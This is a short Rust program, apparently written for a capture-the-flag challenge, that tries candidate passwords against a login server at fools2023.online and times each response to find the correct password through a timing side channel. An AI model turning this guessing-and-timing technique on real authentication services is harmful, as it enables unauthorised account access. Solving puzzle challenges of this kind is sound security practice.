use std::io::prelude::*;
use std::net::TcpStream;
use std::time::{Duration, Instant};
use std::env;

// Expected header:
// ======================================================================
// Welcome to Glitch Research Laboratory Network: Test Server 2 (GRLTS02)
// ======================================================================
// This machine requires authentication.
// Username: 
// length: 265 (there are crlfs for some reason)

// Expected response: 
// >> Please wait...
// >> Username OK. Password required
// Password: 
// length: 62

// Expected response 2: 
// >> Please wait...
// >> Password is incorrect.
// Username: 
// length: 54

fn try_pass(password: &str) -> std::io::Result<(Duration, Duration, bool)> {
    let mut stream = TcpStream::connect("fools2023.online:13338")?;

    const EXPECTED_INTRO_LEN: usize = 265;
    const EXPECTED_UN_RESP_LEN: usize = 62;
    const EXPECTED_PW_RESP_LEN: usize = 54;

    let username = "ax.arwen\n";
    let to_send: String = format!("{}\n{}\n", username, password);

    stream.read_exact(&mut [0; EXPECTED_INTRO_LEN])?;

    let un_start = Instant::now();    
    stream.write_all(to_send.as_bytes())?;
    
    stream.read_exact(&mut [0; EXPECTED_UN_RESP_LEN])?;

    let un_end = Instant::now();

    let mut buf = [0_u8; EXPECTED_PW_RESP_LEN];
    stream.read_exact(&mut buf)?;

    let end = Instant::now();

    let pw_dur = end-un_end; 
    let un_dur = un_end-un_start;  

    let buf_str: String = String::from_utf8_lossy(&buf).to_string();
    let incorrect = buf_str.contains("incorrect");

    Ok((un_dur, pw_dur, !incorrect))
}

fn main() -> std::io::Result<()> {
    for arg in env::args().skip(1) {
        let (un_dur, pw_dur, correct) = try_pass(&arg)?;

        println!("{}, {}, {}, {}", arg, un_dur.as_micros(), pw_dur.as_micros(), correct);
    }


    Ok(())
}